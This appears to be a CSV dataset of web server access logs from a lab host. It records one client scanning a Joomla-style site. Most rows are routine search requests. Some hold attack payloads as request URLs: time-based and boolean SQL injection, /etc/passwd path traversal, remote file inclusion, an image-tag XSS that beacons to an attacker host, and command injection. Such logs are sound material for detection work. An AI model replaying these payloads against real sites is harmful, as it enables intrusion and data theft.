,ip_address,remote_log_name,authenticated_user_name,timestamp,method,requesta_url,protocol,status_code,bytes_transferred,referrer_url,user_agent
5746,192.168.4.25,,,[22/Dec/2016:16:21:24 +0300],POST,/index.php/component/search/,HTTP/1.1,303,379,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5747,192.168.4.25,,,[22/Dec/2016:16:33:04 +0300],POST,/index.php,HTTP/1.1,200,237,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5748,192.168.4.25,,,[22/Dec/2016:16:30:48 +0300],POST,/index.php/component/search/,HTTP/1.1,303,372,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5749,192.168.4.25,,,[22/Dec/2016:16:25:44 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2023,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5750,192.168.4.25,,,[22/Dec/2016:16:24:24 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3057,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5751,192.168.4.25,,,[22/Dec/2016:16:38:51 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5752,192.168.4.25,,,[22/Dec/2016:16:30:17 +0300],POST,/index.php/component/search/,HTTP/1.1,303,434,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5753,192.168.4.25,,,[22/Dec/2016:16:34:05 +0300],GET,"/index.php/component/search/?ordering=popular&searchphrase=(select(0)from(select(sleep(12)))v)/*'%2b(select(0)from(select(sleep(12)))v)%2b'\""%2b(select(0)from(select(sleep(12)))v)%2b\""*/&searchword=",HTTP/1.1,200,3158,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5754,192.168.4.25,,,[22/Dec/2016:16:28:57 +0300],POST,/administrator/index.php,HTTP/1.1,500,1522,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5755,192.168.4.25,,,[22/Dec/2016:16:29:03 +0300],POST,/index.php/component/search/,HTTP/1.1,303,389,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5756,192.168.4.25,,,[22/Dec/2016:16:18:44 +0300],POST,/index.php,HTTP/1.1,200,1822,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5757,192.168.4.25,,,[22/Dec/2016:16:30:56 +0300],POST,/DVWA/login.php,HTTP/1.1,302,469,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5758,192.168.4.25,,,[22/Dec/2016:16:33:01 +0300],POST,/index.php/component/search/,HTTP/1.1,303,379,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5759,192.168.4.25,,,[22/Dec/2016:16:24:54 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3089,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5760,192.168.4.25,,,[22/Dec/2016:16:26:32 +0300],POST,/index.php/component/search/,HTTP/1.1,303,370,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5761,192.168.4.25,,,[22/Dec/2016:16:40:08 +0300],GET,/index.php/component/invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././article/2-uncategorised/1-testsayfasi,HTTP/1.1,400,485,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5762,192.168.4.25,,,[22/Dec/2016:16:28:03 +0300],POST,/index.php/component/search/,HTTP/1.1,303,412,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5763,192.168.4.25,,,[22/Dec/2016:16:21:00 +0300],POST,/index.php/component/search/,HTTP/1.1,303,419,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5764,192.168.4.25,,,[22/Dec/2016:16:35:50 +0300],POST,/index.php/component/search/,HTTP/1.1,303,386,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5765,192.168.4.25,,,[22/Dec/2016:16:21:40 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5766,192.168.4.25,,,[22/Dec/2016:16:18:07 +0300],GET,/tmp,HTTP/1.1,301,571,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5767,192.168.4.25,,,[22/Dec/2016:16:19:02 +0300],GET,/index.php/component/content/?format=http://testasp.vulnweb.com/t/fit.txt%3F.jpg&type=rss&view=featured,HTTP/1.1,500,2107,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5768,192.168.4.25,,,[22/Dec/2016:16:21:20 +0300],POST,/index.php/component/search/,HTTP/1.1,303,389,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5769,192.168.4.25,,,[22/Dec/2016:16:27:18 +0300],POST,/index.php/component/search/,HTTP/1.1,303,393,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5770,192.168.4.25,,,[22/Dec/2016:16:22:50 +0300],POST,/index.php/component/search/,HTTP/1.1,303,426,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5771,192.168.4.25,,,[22/Dec/2016:16:19:10 +0300],GET,/index.php/component/content/?format=feed&type=atom&view=-1%20OR%203*2<(0%2b5%2b966-966)%20--%20,HTTP/1.1,500,2071,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5772,192.168.4.25,,,[22/Dec/2016:16:39:50 +0300],GET,/set%7cset%26set/component/content/article/2-uncategorised/1-testsayfasi,HTTP/1.1,404,562,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5773,192.168.4.25,,,[22/Dec/2016:16:28:03 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3085,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5774,192.168.4.25,,,[22/Dec/2016:16:26:19 +0300],POST,/index.php/component/search/,HTTP/1.1,303,365,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5775,192.168.4.25,,,[22/Dec/2016:16:33:24 +0300],POST,/index.php/component/search/,HTTP/1.1,303,369,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5776,192.168.4.25,,,[22/Dec/2016:16:25:06 +0300],POST,/index.php/component/search/,HTTP/1.1,303,356,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5777,192.168.4.25,,,[22/Dec/2016:16:24:46 +0300],POST,/index.php/component/search/,HTTP/1.1,303,416,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5778,192.168.4.25,,,[22/Dec/2016:16:38:04 +0300],POST,/index.php/component/users/?task=user.login,HTTP/1.1,200,237,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5779,192.168.4.25,,,[22/Dec/2016:16:27:20 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5780,192.168.4.25,,,[22/Dec/2016:16:38:51 +0300],POST,/index.php/component/users/?task=registration.register,HTTP/1.1,200,237,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5781,192.168.4.25,,,[22/Dec/2016:16:28:45 +0300],GET,/index.php/component/users/?view=login<img%20sRc='http://attacker-9527/log.php%3f,HTTP/1.1,500,2103,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5782,192.168.4.25,,,[22/Dec/2016:16:36:49 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3054,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5783,192.168.4.25,,,[22/Dec/2016:16:21:54 +0300],POST,/index.php/component/search/,HTTP/1.1,303,380,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5784,192.168.4.25,,,[22/Dec/2016:16:40:18 +0300],GET,/index.php/component/content/248''/2-uncategorised/1-testsayfasi,HTTP/1.1,500,2043,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5785,192.168.4.25,,,[22/Dec/2016:16:23:12 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3084,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5786,192.168.4.25,,,[22/Dec/2016:16:21:39 +0300],POST,/index.php/component/search/,HTTP/1.1,303,366,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5787,192.168.4.25,,,[22/Dec/2016:16:26:45 +0300],POST,/index.php/component/search/,HTTP/1.1,303,361,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5788,192.168.4.25,,,[22/Dec/2016:16:30:16 +0300],GET,/index.php?format=mnNysu5Z&type=rss,HTTP/1.1,500,2059,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5789,192.168.4.25,,,[22/Dec/2016:16:20:59 +0300],POST,/index.php/component/search/,HTTP/1.1,303,402,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5790,192.168.4.25,,,[22/Dec/2016:16:28:10 +0300],POST,/index.php/component/search/,HTTP/1.1,303,396,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5791,192.168.4.25,,,[22/Dec/2016:16:22:33 +0300],POST,/index.php/component/search/,HTTP/1.1,303,352,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5792,192.168.4.25,,,[22/Dec/2016:16:22:26 +0300],POST,/index.php/component/search/,HTTP/1.1,303,373,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5793,192.168.4.25,,,[22/Dec/2016:16:34:30 +0300],GET,/index.php/component/search/?ordering=oldest&searchphrase=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg&searchword=,HTTP/1.1,200,3184,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5794,192.168.4.25,,,[22/Dec/2016:16:26:02 +0300],POST,/index.php/component/search/,HTTP/1.1,303,371,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5795,192.168.4.25,,,[22/Dec/2016:16:35:27 +0300],GET,/index.php/component/search/?ordering=popular&searchphrase=any&searchword=1*1*1*1,HTTP/1.1,200,3151,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5796,192.168.4.25,,,[22/Dec/2016:16:24:01 +0300],POST,/index.php/component/search/,HTTP/1.1,303,387,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5797,192.168.4.25,,,[22/Dec/2016:16:19:06 +0300],GET,/index.php/component/content/?format=)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))&type=atom&view=featured,HTTP/1.1,500,2045,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5798,192.168.4.25,,,[22/Dec/2016:16:31:15 +0300],GET,/index.php/component/647'/,HTTP/1.1,404,3990,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5799,192.168.4.25,,,[22/Dec/2016:16:19:21 +0300],POST,/index.php,HTTP/1.1,200,338,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5800,192.168.4.25,,,[22/Dec/2016:16:27:36 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2011,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5801,192.168.4.25,,,[22/Dec/2016:16:29:27 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3085,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5802,192.168.4.25,,,[22/Dec/2016:16:24:45 +0300],POST,/index.php/component/search/,HTTP/1.1,303,355,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5803,192.168.4.25,,,[22/Dec/2016:16:18:47 +0300],POST,/index.php,HTTP/1.1,200,1824,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5804,192.168.4.25,,,[22/Dec/2016:16:35:21 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3052,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5805,192.168.4.25,,,[22/Dec/2016:16:22:08 +0300],POST,/index.php/component/search/,HTTP/1.1,303,375,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5806,192.168.4.25,,,[22/Dec/2016:16:32:59 +0300],POST,/index.php,HTTP/1.1,404,3997,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5807,192.168.4.25,,,[22/Dec/2016:16:28:08 +0300],POST,/index.php/component/search/,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5808,192.168.4.25,,,[22/Dec/2016:16:31:47 +0300],POST,/index.php/component/search/,HTTP/1.1,200,2572,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5809,192.168.4.25,,,[22/Dec/2016:16:18:44 +0300],POST,/index.php,HTTP/1.1,200,1827,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5810,192.168.4.25,,,[22/Dec/2016:16:18:34 +0300],POST,/index.php,HTTP/1.1,200,1798,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5811,192.168.4.25,,,[22/Dec/2016:16:38:13 +0300],POST,/index.php/component/search/,HTTP/1.1,200,2613,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5812,192.168.4.25,,,[22/Dec/2016:16:21:22 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3082,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5813,192.168.4.25,,,[22/Dec/2016:16:18:43 +0300],POST,/index.php,HTTP/1.1,200,1809,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5814,192.168.4.25,,,[22/Dec/2016:16:22:21 +0300],POST,/index.php/component/search/,HTTP/1.1,303,399,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5815,192.168.4.25,,,[22/Dec/2016:16:36:38 +0300],GET,"/index.php/component/search/?ordering=newest&searchphrase=any&searchword=1\""sTYLe='acu:Expre/**/SSion(RBUT(9104))'bad=\",HTTP/1.1,200,3299,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5816,192.168.4.25,,,[22/Dec/2016:16:24:51 +0300],POST,/index.php/component/search/,HTTP/1.1,303,392,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5817,192.168.4.25,,,[22/Dec/2016:16:26:49 +0300],POST,/index.php/component/search/,HTTP/1.1,303,381,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5818,192.168.4.25,,,[22/Dec/2016:16:29:07 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3057,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5819,192.168.4.25,,,[22/Dec/2016:16:26:47 +0300],POST,/index.php/component/search/,HTTP/1.1,303,378,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5820,192.168.4.25,,,[22/Dec/2016:16:32:12 +0300],POST,/index.php,HTTP/1.1,303,368,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5821,192.168.4.25,,,[22/Dec/2016:16:27:31 +0300],POST,/index.php/component/search/,HTTP/1.1,303,375,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5822,192.168.4.25,,,[22/Dec/2016:16:34:37 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3055,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5823,192.168.4.25,,,[22/Dec/2016:16:29:07 +0300],POST,/administrator/index.php,HTTP/1.1,500,1522,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5824,192.168.4.25,,,[22/Dec/2016:16:24:00 +0300],POST,/index.php/component/search/,HTTP/1.1,500,2017,,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5825,192.168.4.25,,,[22/Dec/2016:16:25:21 +0300],POST,/index.php/component/search/,HTTP/1.1,200,3083,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
5826,192.168.4.25,,,[22/Dec/2016:16:26:46 +0300],POST,/index.php/component/search/,HTTP/1.1,303,359,http://192.168.4.161/DVWA,"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
